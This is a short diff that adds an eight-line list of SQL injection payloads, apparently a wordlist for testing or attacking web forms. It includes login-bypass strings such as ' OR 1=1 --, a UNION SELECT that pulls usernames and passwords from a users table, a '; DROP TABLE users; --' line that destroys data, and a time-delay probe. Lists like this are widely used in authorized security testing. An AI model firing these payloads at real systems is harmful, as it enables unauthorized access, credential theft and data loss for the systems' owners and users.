@@ -1,0 +1,8 @@
+' OR 1=1 --
+' OR 'a'='a' --
+' UNION SELECT NULL, username, password FROM users --
+' AND 1=1 --
+'; DROP TABLE users; --
+' OR 1=1 LIMIT 1 OFFSET 1 --
+' OR 1=1 -- waitfor delay '0:0:10'
+' AND 1=1 --
